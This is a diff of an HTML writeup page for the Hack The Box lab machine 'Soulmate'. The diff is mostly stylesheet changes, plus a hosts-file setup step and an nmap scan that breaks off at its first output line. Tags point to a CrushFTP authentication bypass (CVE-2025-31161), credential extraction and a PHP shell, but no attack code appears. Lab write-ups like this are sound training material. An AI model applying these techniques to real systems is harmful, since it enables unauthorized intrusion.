@@ -1,725 +1,490 @@
-<html><head><meta http-equiv="Content-Type" content="text/html; charset=utf-8"/><title>Soulmate</title><style>
-/* cspell:disable-file */
-/* webkit printing magic: print all background colors */
-html {
-	-webkit-print-color-adjust: exact;
-}
-* {
-	box-sizing: border-box;
-	-webkit-print-color-adjust: exact;
-}
-
-html,
-body {
-	margin: 0;
-	padding: 0;
-}
-@media only screen {
-	body {
-		margin: 2em auto;
-		max-width: 900px;
-		color: rgb(55, 53, 47);
-	}
-}
-
-body {
-	line-height: 1.5;
-	white-space: pre-wrap;
-}
-
-a,
-a.visited {
-	color: inherit;
-	text-decoration: underline;
-}
-
-.pdf-relative-link-path {
-	font-size: 80%;
-	color: #444;
-}
-
-h1,
-h2,
-h3 {
-	letter-spacing: -0.01em;
-	line-height: 1.2;
-	font-weight: 600;
-	margin-bottom: 0;
-}
-
-.page-title {
-	font-size: 2.5rem;
-	font-weight: 700;
-	margin-top: 0;
-	margin-bottom: 0.75em;
-}
-
-h1 {
-	font-size: 1.875rem;
-	margin-top: 1.875rem;
-}
-
-h2 {
-	font-size: 1.5rem;
-	margin-top: 1.5rem;
-}
-
-h3 {
-	font-size: 1.25rem;
-	margin-top: 1.25rem;
-}
-
-.source {
-	border: 1px solid #ddd;
-	border-radius: 3px;
-	padding: 1.5em;
-	word-break: break-all;
-}
-
-.callout {
-	border-radius: 3px;
-	padding: 1rem;
-}
-
-figure {
-	margin: 1.25em 0;
-	page-break-inside: avoid;
-}
-
-figcaption {
-	opacity: 0.5;
-	font-size: 85%;
-	margin-top: 0.5em;
-}
-
-mark {
-	background-color: transparent;
-}
-
-.indented {
-	padding-left: 1.5em;
-}
-
-hr {
-	background: transparent;
-	display: block;
-	width: 100%;
-	height: 1px;
-	visibility: visible;
-	border: none;
-	border-bottom: 1px solid rgba(55, 53, 47, 0.09);
-}
-
-img {
-	max-width: 100%;
-}
-
-@media only print {
-	img {
-		max-height: 100vh;
-		object-fit: contain;
-	}
-}
-
-@page {
-	margin: 1in;
-}
-
-.collection-content {
-	font-size: 0.875rem;
-}
-
-.collection-content td {
-	white-space: pre-wrap;
-	word-break: break-word;
-}
-
-.column-list {
-	display: flex;
-	justify-content: space-between;
-}
-
-.column {
-	padding: 0 1em;
-}
-
-.column:first-child {
-	padding-left: 0;
-}
-
-.column:last-child {
-	padding-right: 0;
-}
-
-.table_of_contents-item {
-	display: block;
-	font-size: 0.875rem;
-	line-height: 1.3;
-	padding: 0.125rem;
-}
-
-.table_of_contents-indent-1 {
-	margin-left: 1.5rem;
-}
-
-.table_of_contents-indent-2 {
-	margin-left: 3rem;
-}
-
-.table_of_contents-indent-3 {
-	margin-left: 4.5rem;
-}
-
-.table_of_contents-link {
-	text-decoration: none;
-	opacity: 0.7;
-	border-bottom: 1px solid rgba(55, 53, 47, 0.18);
-}
-
-table,
-th,
-td {
-	border: 1px solid rgba(55, 53, 47, 0.09);
-	border-collapse: collapse;
-}
-
-table {
-	border-left: none;
-	border-right: none;
-}
-
-th,
-td {
-	font-weight: normal;
-	padding: 0.25em 0.5em;
-	line-height: 1.5;
-	min-height: 1.5em;
-	text-align: left;
-}
-
-th {
-	color: rgba(55, 53, 47, 0.6);
-}
-
-ol,
-ul {
-	margin: 0;
-	margin-block-start: 0.6em;
-	margin-block-end: 0.6em;
-}
-
-li > ol:first-child,
-li > ul:first-child {
-	margin-block-start: 0.6em;
-}
-
-ul > li {
-	list-style: disc;
-}
-
-ul.to-do-list {
-	padding-inline-start: 0;
-}
-
-ul.to-do-list > li {
-	list-style: none;
-}
-
-.to-do-children-checked {
-	text-decoration: line-through;
-	opacity: 0.375;
-}
-
-ul.toggle > li {
-	list-style: none;
-}
-
-ul {
-	padding-inline-start: 1.7em;
-}
-
-ul > li {
-	padding-left: 0.1em;
-}
-
-ol {
-	padding-inline-start: 1.6em;
-}
-
-ol > li {
-	padding-left: 0.2em;
-}
-
-.mono ol {
-	padding-inline-start: 2em;
-}
-
-.mono ol > li {
-	text-indent: -0.4em;
-}
-
-.toggle {
-	padding-inline-start: 0em;
-	list-style-type: none;
-}
-
-/* Indent toggle children */
-.toggle > li > details {
-	padding-left: 1.7em;
-}
-
-.toggle > li > details > summary {
-	margin-left: -1.1em;
-}
-
-.selected-value {
-	display: inline-block;
-	padding: 0 0.5em;
-	background: rgba(206, 205, 202, 0.5);
-	border-radius: 3px;
-	margin-right: 0.5em;
-	margin-top: 0.3em;
-	margin-bottom: 0.3em;
-	white-space: nowrap;
-}
-
-.collection-title {
-	display: inline-block;
-	margin-right: 1em;
-}
-
-.page-description {
-	margin-bottom: 2em;
-}
-
-.simple-table {
-	margin-top: 1em;
-	font-size: 0.875rem;
-	empty-cells: show;
-}
-.simple-table td {
-	height: 29px;
-	min-width: 120px;
-}
-
-.simple-table th {
-	height: 29px;
-	min-width: 120px;
-}
-
-.simple-table-header-color {
-	background: rgb(247, 246, 243);
-	color: black;
-}
-.simple-table-header {
-	font-weight: 500;
-}
-
-time {
-	opacity: 0.5;
-}
-
-.icon {
-	display: inline-block;
-	max-width: 1.2em;
-	max-height: 1.2em;
-	text-decoration: none;
-	vertical-align: text-bottom;
-	margin-right: 0.5em;
-}
-
-img.icon {
-	border-radius: 3px;
-}
-
-.user-icon {
-	width: 1.5em;
-	height: 1.5em;
-	border-radius: 100%;
-	margin-right: 0.5rem;
-}
-
-.user-icon-inner {
-	font-size: 0.8em;
-}
-
-.text-icon {
-	border: 1px solid #000;
-	text-align: center;
-}
-
-.page-cover-image {
-	display: block;
-	object-fit: cover;
-	width: 100%;
-	max-height: 30vh;
-}
-
-.page-header-icon {
-	font-size: 3rem;
-	margin-bottom: 1rem;
-}
-
-.page-header-icon-with-cover {
-	margin-top: -0.72em;
-	margin-left: 0.07em;
-}
-
-.page-header-icon img {
-	border-radius: 3px;
-}
-
-.link-to-page {
-	margin: 1em 0;
-	padding: 0;
-	border: none;
-	font-weight: 500;
-}
-
-p > .user {
-	opacity: 0.5;
-}
-
-td > .user,
-td > time {
-	white-space: nowrap;
-}
-
-input[type="checkbox"] {
-	transform: scale(1.5);
-	margin-right: 0.6em;
-	vertical-align: middle;
-}
-
-p {
-	margin-top: 0.5em;
-	margin-bottom: 0.5em;
-}
-
-.image {
-	border: none;
-	margin: 1.5em 0;
-	padding: 0;
-	border-radius: 0;
-	text-align: center;
-}
-
-.code,
-code {
-	background: rgba(135, 131, 120, 0.15);
-	border-radius: 3px;
-	padding: 0.2em 0.4em;
-	border-radius: 3px;
-	font-size: 85%;
-	tab-size: 2;
-}
-
-code {
-	color: #eb5757;
-}
-
-.code {
-	padding: 1.5em 1em;
-}
-
-.code-wrap {
-	white-space: pre-wrap;
-	word-break: break-all;
-}
-
-.code > code {
-	background: none;
-	padding: 0;
-	font-size: 100%;
-	color: inherit;
-}
-
-blockquote {
-	font-size: 1em;
-	margin: 1em 0;
-	padding-left: 1em;
-	border-left: 3px solid rgb(55, 53, 47);
-}
-
-blockquote.quote-large {
-	font-size: 1.25em;
-}
-
-.bookmark {
-	text-decoration: none;
-	max-height: 8em;
-	padding: 0;
-	display: flex;
-	width: 100%;
-	align-items: stretch;
-}
-
-.bookmark-title {
-	font-size: 0.85em;
-	overflow: hidden;
-	text-overflow: ellipsis;
-	height: 1.75em;
-	white-space: nowrap;
-}
-
-.bookmark-text {
-	display: flex;
-	flex-direction: column;
-}
-
-.bookmark-info {
-	flex: 4 1 180px;
-	padding: 12px 14px 14px;
-	display: flex;
-	flex-direction: column;
-	justify-content: space-between;
-}
-
-.bookmark-image {
-	width: 33%;
-	flex: 1 1 180px;
-	display: block;
-	position: relative;
-	object-fit: cover;
-	border-radius: 1px;
-}
-
-.bookmark-description {
-	color: rgba(55, 53, 47, 0.6);
-	font-size: 0.75em;
-	overflow: hidden;
-	max-height: 4.5em;
-	word-break: break-word;
-}
-
-.bookmark-href {
-	font-size: 0.75em;
-	margin-top: 0.25em;
-}
-
-.sans { font-family: ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI Variable Display", "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol"; }
-.code { font-family: "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace; }
-.serif { font-family: Lyon-Text, Georgia, ui-serif, serif; }
-.mono { font-family: iawriter-mono, Nitti, Menlo, Courier, monospace; }
-.pdf .sans { font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI Variable Display", "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK JP'; }
-.pdf:lang(zh-CN) .sans { font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI Variable Display", "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK SC'; }
-.pdf:lang(zh-TW) .sans { font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI Variable Display", "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK TC'; }
-.pdf:lang(ko-KR) .sans { font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI Variable Display", "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK KR'; }
-.pdf .code { font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK JP'; }
-.pdf:lang(zh-CN) .code { font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK SC'; }
-.pdf:lang(zh-TW) .code { font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK TC'; }
-.pdf:lang(ko-KR) .code { font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK KR'; }
-.pdf .serif { font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK JP'; }
-.pdf:lang(zh-CN) .serif { font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK SC'; }
-.pdf:lang(zh-TW) .serif { font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK TC'; }
-.pdf:lang(ko-KR) .serif { font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK KR'; }
-.pdf .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK JP'; }
-.pdf:lang(zh-CN) .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK SC'; }
-.pdf:lang(zh-TW) .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK TC'; }
-.pdf:lang(ko-KR) .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK KR'; }
-.highlight-default {
-	color: rgba(44, 44, 43, 1);
-}
-.highlight-gray {
-	color: rgba(115, 114, 110, 1);
-	fill: rgba(115, 114, 110, 1);
-}
-.highlight-brown {
-	color: rgba(159, 107, 83, 1);
-	fill: rgba(159, 107, 83, 1);
-}
-.highlight-orange {
-	color: rgba(217, 115, 13, 1);
-	fill: rgba(217, 115, 13, 1);
-}
-.highlight-yellow {
-	color: rgba(203, 145, 47, 1);
-	fill: rgba(203, 145, 47, 1);
-}
-.highlight-teal {
-	color: rgba(68, 131, 97, 1);
-	fill: rgba(68, 131, 97, 1);
-}
-.highlight-blue {
-	color: rgba(51, 126, 169, 1);
-	fill: rgba(51, 126, 169, 1);
-}
-.highlight-purple {
-	color: rgba(144, 101, 176, 1);
-	fill: rgba(144, 101, 176, 1);
-}
-.highlight-pink {
-	color: rgba(193, 76, 138, 1);
-	fill: rgba(193, 76, 138, 1);
-}
-.highlight-red {
-	color: rgba(205, 60, 58, 1);
-	fill: rgba(205, 60, 58, 1);
-}
-.highlight-default_background {
-	color: rgba(44, 44, 43, 1);
-}
-.highlight-gray_background {
-	background: rgba(248, 248, 247, 1);
-}
-.highlight-brown_background {
-	background: rgba(244, 238, 238, 1);
-}
-.highlight-orange_background {
-	background: rgba(251, 236, 221, 1);
-}
-.highlight-yellow_background {
-	background: rgba(251, 243, 219, 1);
-}
-.highlight-teal_background {
-	background: rgba(237, 243, 236, 1);
-}
-.highlight-blue_background {
-	background: rgba(231, 243, 248, 1);
-}
-.highlight-purple_background {
-	background: rgba(248, 243, 252, 1);
-}
-.highlight-pink_background {
-	background: rgba(252, 241, 246, 1);
-}
-.highlight-red_background {
-	background: rgba(253, 235, 236, 1);
-}
-.block-color-default {
-	color: inherit;
-	fill: inherit;
-}
-.block-color-gray {
-	color: rgba(115, 114, 110, 1);
-	fill: rgba(115, 114, 110, 1);
-}
-.block-color-brown {
-	color: rgba(159, 107, 83, 1);
-	fill: rgba(159, 107, 83, 1);
-}
-.block-color-orange {
-	color: rgba(217, 115, 13, 1);
-	fill: rgba(217, 115, 13, 1);
-}
-.block-color-yellow {
-	color: rgba(203, 145, 47, 1);
-	fill: rgba(203, 145, 47, 1);
-}
-.block-color-teal {
-	color: rgba(68, 131, 97, 1);
-	fill: rgba(68, 131, 97, 1);
-}
-.block-color-blue {
-	color: rgba(51, 126, 169, 1);
-	fill: rgba(51, 126, 169, 1);
-}
-.block-color-purple {
-	color: rgba(144, 101, 176, 1);
-	fill: rgba(144, 101, 176, 1);
-}
-.block-color-pink {
-	color: rgba(193, 76, 138, 1);
-	fill: rgba(193, 76, 138, 1);
-}
-.block-color-red {
-	color: rgba(205, 60, 58, 1);
-	fill: rgba(205, 60, 58, 1);
-}
-.block-color-default_background {
-	color: inherit;
-	fill: inherit;
-}
-.block-color-gray_background {
-	background: rgba(248, 248, 247, 1);
-}
-.block-color-brown_background {
-	background: rgba(244, 238, 238, 1);
-}
-.block-color-orange_background {
-	background: rgba(251, 236, 221, 1);
-}
-.block-color-yellow_background {
-	background: rgba(251, 243, 219, 1);
-}
-.block-color-teal_background {
-	background: rgba(237, 243, 236, 1);
-}
-.block-color-blue_background {
-	background: rgba(231, 243, 248, 1);
-}
-.block-color-purple_background {
-	background: rgba(248, 243, 252, 1);
-}
-.block-color-pink_background {
-	background: rgba(252, 241, 246, 1);
-}
-.block-color-red_background {
-	background: rgba(253, 235, 236, 1);
-}
-.select-value-color-default { background-color: rgba(42, 28, 0, 0.07); }
-.select-value-color-gray { background-color: rgba(28, 19, 1, 0.11); }
-.select-value-color-brown { background-color: rgba(127, 51, 0, 0.156); }
-.select-value-color-orange { background-color: rgba(196, 88, 0, 0.203); }
-.select-value-color-yellow { background-color: rgba(209, 156, 0, 0.282); }
-.select-value-color-green { background-color: rgba(0, 96, 38, 0.156); }
-.select-value-color-blue { background-color: rgba(0, 99, 174, 0.172); }
-.select-value-color-purple { background-color: rgba(92, 0, 163, 0.141); }
-.select-value-color-pink { background-color: rgba(183, 0, 78, 0.152); }
-.select-value-color-red { background-color: rgba(206, 24, 0, 0.164); }
-
-.checkbox {
-	display: inline-flex;
-	vertical-align: text-bottom;
-	width: 16;
-	height: 16;
-	background-size: 16px;
-	margin-left: 2px;
-	margin-right: 5px;
-}
-
-.checkbox-on {
-	background-image: url("data:image/svg+xml;charset=UTF-8,%3Csvg%20width%3D%2216%22%20height%3D%2216%22%20viewBox%3D%220%200%2016%2016%22%20fill%3D%22none%22%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%3E%0A%3Crect%20width%3D%2216%22%20height%3D%2216%22%20fill%3D%22%2358A9D7%22%2F%3E%0A%3Cpath%20d%3D%22M6.71429%2012.2852L14%204.9995L12.7143%203.71436L6.71429%209.71378L3.28571%206.2831L2%207.57092L6.71429%2012.2852Z%22%20fill%3D%22white%22%2F%3E%0A%3C%2Fsvg%3E");
-}
-
-.checkbox-off {
-	background-image: url("data:image/svg+xml;charset=UTF-8,%3Csvg%20width%3D%2216%22%20height%3D%2216%22%20viewBox%3D%220%200%2016%2016%22%20fill%3D%22none%22%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%3E%0A%3Crect%20x%3D%220.75%22%20y%3D%220.75%22%20width%3D%2214.5%22%20height%3D%2214.5%22%20fill%3D%22white%22%20stroke%3D%22%2336352F%22%20stroke-width%3D%221.5%22%2F%3E%0A%3C%2Fsvg%3E");
-}
-	
-</style></head><body><article id="267e36ec-aa11-8099-bedf-d846655894ed" class="page sans"><header><div class="page-header-icon undefined"><img class="icon" src="https://htb-mp-prod-public-storage.s3.eu-central-1.amazonaws.com/avatars/2c47fcf9c85c7fbdda73a9c1b54fd60e.png"/></div><h1 class="page-title"><strong>Soulmate</strong></h1><p class="page-description"></p></header><div class="page-body"><h2 id="269e36ec-aa11-803a-a815-dd94f8fd2760" class="">SETUP</h2><p id="269e36ec-aa11-8011-8ca5-e446b0936c20" class="">Add a local DNS res</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="269e36ec-aa11-8017-85e6-e0e09d55e0f3" class="code code-wrap"><code class="language-PowerShell" style="white-space:pre-wrap;word-break:break-all">echo &quot;10.10.11.86 soulmate.htb&quot; | sudo tee -a /etc/hosts</code></pre><details open=""><summary style="font-weight:600;font-size:1.5em;line-height:1.3;margin:0">Recon 👁️</summary><div class="indented"><h3 id="269e36ec-aa11-8096-9d1b-fa7a1a2bb835" class="">NMAP</h3><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="269e36ec-aa11-8064-a627-e9bcc7f5fdfd" class="code code-wrap"><code class="language-PowerShell" style="white-space:pre-wrap;word-break:break-all">└─# nmap -Pn -A 10.10.11.86
-Starting Nmap 7.95 ( https://nmap.org ) at 2025-09-09 23:01 AEST
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Soulmate Writeup | PLSCARRYME - HTB Writeups</title>
+    <link href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism-tomorrow.min.css" rel="stylesheet">
+    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" rel="stylesheet">
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background: linear-gradient(135deg, #0c0c0c 0%, #1a1a1a 100%);
+            color: #e0e0e0;
+            line-height: 1.8;
+            min-height: 100vh;
+        }
+
+        .container {
+            max-width: 900px;
+            margin: 0 auto;
+            padding: 0 20px;
+        }
+
+        /* Header */
+        header {
+            background: rgba(0, 0, 0, 0.9);
+            backdrop-filter: blur(10px);
+            border-bottom: 2px solid #9fef00;
+            position: sticky;
+            top: 0;
+            z-index: 100;
+        }
+
+        nav {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 1rem 0;
+        }
+
+        .logo {
+            font-size: 1.5rem;
+            font-weight: bold;
+            color: #9fef00;
+            text-decoration: none;
+        }
+
+        .back-link {
+            color: #9fef00;
+            text-decoration: none;
+            display: flex;
+            align-items: center;
+            gap: 0.5rem;
+            transition: opacity 0.3s ease;
+        }
+
+        .back-link:hover {
+            opacity: 0.8;
+        }
+
+        /* Writeup Header */
+        .writeup-header {
+            text-align: center;
+            padding: 3rem 0;
+            border-bottom: 1px solid rgba(159, 239, 0, 0.2);
+            margin-bottom: 3rem;
+        }
+
+        .writeup-title {
+            font-size: 3rem;
+            color: #9fef00;
+            margin-bottom: 1rem;
+            text-shadow: 0 0 20px rgba(159, 239, 0, 0.3);
+        }
+
+        .writeup-meta {
+            display: flex;
+            justify-content: center;
+            gap: 2rem;
+            margin-bottom: 1.5rem;
+            flex-wrap: wrap;
+        }
+
+        .meta-item {
+            display: flex;
+            align-items: center;
+            gap: 0.5rem;
+            opacity: 0.8;
+        }
+
+        .difficulty {
+            padding: 0.5rem 1rem;
+            border-radius: 25px;
+            font-weight: bold;
+            text-transform: uppercase;
+            font-size: 0.9rem;
+        }
+
+        .difficulty.easy { background: #28a745; }
+        .difficulty.medium { background: #ffc107; color: #000; }
+        .difficulty.hard { background: #dc3545; }
+
+        .writeup-tags {
+            display: flex;
+            justify-content: center;
+            gap: 0.5rem;
+            flex-wrap: wrap;
+        }
+
+        .tag {
+            background: rgba(159, 239, 0, 0.2);
+            color: #9fef00;
+            padding: 0.3rem 0.8rem;
+            border-radius: 15px;
+            font-size: 0.8rem;
+        }
+
+        /* Content */
+        .writeup-content {
+            padding-bottom: 3rem;
+        }
+
+        .writeup-content h1,
+        .writeup-content h2,
+        .writeup-content h3 {
+            color: #9fef00;
+            margin: 2rem 0 1rem 0;
+            border-left: 4px solid #9fef00;
+            padding-left: 1rem;
+        }
+
+        .writeup-content h1 { font-size: 2rem; }
+        .writeup-content h2 { font-size: 1.5rem; }
+        .writeup-content h3 { font-size: 1.2rem; }
+
+        .writeup-content p {
+            margin-bottom: 1.5rem;
+            text-align: justify;
+        }
+
+        .writeup-content ul,
+        .writeup-content ol {
+            margin: 1rem 0 1.5rem 2rem;
+        }
+
+        .writeup-content li {
+            margin-bottom: 0.5rem;
+        }
+
+        /* Code blocks */
+        .writeup-content pre {
+            background: rgba(0, 0, 0, 0.6);
+            border: 1px solid rgba(159, 239, 0, 0.3);
+            border-radius: 8px;
+            padding: 1.5rem;
+            overflow-x: auto;
+            margin: 1.5rem 0;
+            position: relative;
+        }
+
+        .writeup-content code {
+            color: #9fef00;
+            font-family: 'Courier New', monospace;
+            font-size: 0.9rem;
+        }
+
+        .writeup-content p code {
+            background: rgba(159, 239, 0, 0.2);
+            padding: 0.2rem 0.4rem;
+            border-radius: 4px;
+            font-size: 0.85rem;
+        }
+
+        /* Images */
+        .writeup-content img {
+            max-width: 100%;
+            height: auto;
+            border-radius: 8px;
+            margin: 2rem 0;
+            border: 1px solid rgba(159, 239, 0, 0.3);
+            box-shadow: 0 4px 20px rgba(0, 0, 0, 0.5);
+        }
+
+        /* Blockquotes */
+        .writeup-content blockquote {
+            border-left: 4px solid #9fef00;
+            background: rgba(159, 239, 0, 0.1);
+            padding: 1rem 1.5rem;
+            margin: 1.5rem 0;
+            border-radius: 0 8px 8px 0;
+            font-style: italic;
+        }
+
+        /* Table of Contents */
+        .toc {
+            background: rgba(255, 255, 255, 0.05);
+            border: 1px solid rgba(159, 239, 0, 0.3);
+            border-radius: 8px;
+            padding: 2rem;
+            margin: 2rem 0;
+        }
+
+        .toc h3 {
+            color: #9fef00;
+            margin-bottom: 1rem;
+            border: none;
+            padding: 0;
+        }
+
+        .toc ul {
+            list-style: none;
+            margin: 0;
+        }
+
+        .toc ul li {
+            margin-bottom: 0.5rem;
+        }
+
+        .toc a {
+            color: #e0e0e0;
+            text-decoration: none;
+            transition: color 0.3s ease;
+        }
+
+        .toc a:hover {
+            color: #9fef00;
+        }
+
+        /* Navigation buttons */
+        .nav-buttons {
+            display: flex;
+            justify-content: space-between;
+            margin: 3rem 0;
+            gap: 1rem;
+        }
+
+        .nav-button {
+            background: linear-gradient(45deg, #9fef00, #7bc800);
+            color: #000;
+            padding: 1rem 2rem;
+            border: none;
+            border-radius: 8px;
+            font-weight: bold;
+            text-decoration: none;
+            transition: transform 0.2s ease;
+            flex: 1;
+            text-align: center;
+            max-width: 200px;
+        }
+
+        .nav-button:hover {
+            transform: translateY(-2px);
+        }
+
+        .nav-button.disabled {
+            background: rgba(255, 255, 255, 0.1);
+            color: #666;
+            cursor: not-allowed;
+        }
+
+        /* Progress bar */
+        .reading-progress {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 0%;
+            height: 3px;
+            background: linear-gradient(to right, #9fef00, #7bc800);
+            z-index: 1000;
+            transition: width 0.1s ease;
+        }
+
+        /* Responsive */
+        @media (max-width: 768px) {
+            .writeup-title {
+                font-size: 2rem;
+            }
+
+            .writeup-meta {
+                flex-direction: column;
+                gap: 1rem;
+            }
+
+            .writeup-content pre {
+                padding: 1rem;
+                font-size: 0.8rem;
+            }
+
+            .nav-buttons {
+                flex-direction: column;
+            }
+
+            .nav-button {
+                max-width: none;
+            }
+        }
+
+        /* Highlight boxes */
+        .info-box {
+            background: rgba(0, 123, 255, 0.1);
+            border-left: 4px solid #007bff;
+            padding: 1rem 1.5rem;
+            margin: 1.5rem 0;
+            border-radius: 0 8px 8px 0;
+        }
+
+        .warning-box {
+            background: rgba(255, 193, 7, 0.1);
+            border-left: 4px solid #ffc107;
+            padding: 1rem 1.5rem;
+            margin: 1.5rem 0;
+            border-radius: 0 8px 8px 0;
+        }
+
+        .success-box {
+            background: rgba(40, 167, 69, 0.1);
+            border-left: 4px solid #28a745;
+            padding: 1rem 1.5rem;
+            margin: 1.5rem 0;
+            border-radius: 0 8px 8px 0;
+        }
+
+        .step-section {
+            margin: 3rem 0;
+            padding: 2rem;
+            background: rgba(255, 255, 255, 0.02);
+            border-radius: 12px;
+            border: 1px solid rgba(159, 239, 0, 0.1);
+        }
+
+        /* Toggle sections */
+        details {
+            margin: 2rem 0;
+            background: rgba(255, 255, 255, 0.02);
+            border-radius: 12px;
+            border: 1px solid rgba(159, 239, 0, 0.1);
+        }
+
+        summary {
+            font-weight: 600;
+            font-size: 1.5em;
+            line-height: 1.3;
+            margin: 0;
+            padding: 1.5rem;
+            cursor: pointer;
+            color: #9fef00;
+            border-radius: 12px;
+            transition: background 0.3s ease;
+        }
+
+        summary:hover {
+            background: rgba(159, 239, 0, 0.05);
+        }
+
+        details[open] summary {
+            border-bottom: 1px solid rgba(159, 239, 0, 0.2);
+            border-radius: 12px 12px 0 0;
+        }
+
+        .indented {
+            padding: 1.5rem;
+        }
+    </style>
+</head>
+<body>
+    <div class="reading-progress" id="reading-progress"></div>
+    
+    <header>
+        <nav class="container">
+            <a href="../index.html" class="logo"><i class="fas fa-terminal"></i> PLSCARRYME</a>
+            <a href="../index.html" class="back-link">
+                <i class="fas fa-arrow-left"></i>
+                Back to Home
+            </a>
+        </nav>
+    </header>
+
+    <main class="container">
+        <section class="writeup-header">
+            <h1 class="writeup-title">💕 Soulmate</h1>
+            
+            <div class="writeup-meta">
+                <div class="meta-item">
+                    <i class="fas fa-calendar"></i>
+                    <span>September 10, 2025</span>
+                </div>
+                <div class="meta-item">
+                    <i class="fas fa-desktop"></i>
+                    <span>Linux</span>
+                </div>
+                <div class="meta-item">
+                    <i class="fas fa-clock"></i>
+                    <span>4 hours</span>
+                </div>
+                <div class="meta-item">
+                    <span class="difficulty easy">Easy</span>
+                </div>
+            </div>
+
+            <div class="writeup-tags">
+                <span class="tag">CVE-2025-31161</span>
+                <span class="tag">CrushFTP</span>
+                <span class="tag">Authentication Bypass</span>
+                <span class="tag">File Upload</span>
+                <span class="tag">Erlang SSH</span>
+                <span class="tag">Credential Extraction</span>
+                <span class="tag">PHP Shell</span>
+            </div>
+        </section>
+
+        <section class="writeup-content">
+            <h2>🔧 SETUP</h2>
+            <p>Add a local DNS resolution for the target:</p>
+            
+            <pre><code class="language-bash">echo "10.10.11.86 soulmate.htb" | sudo tee -a /etc/hosts</code></pre>
+
+            <details open>
+                <summary>Recon 👁️</summary>
+                <div class="indented">
+                    <h3>NMAP</h3>
+                    
+                    <pre><code class="language-bash">nmap -Pn -A 10.10.11.86</code></pre>
+
+                    <pre><code class="language-text">Starting Nmap 7.95 ( https://nmap.org ) at 2025-09-09 23:01 AEST
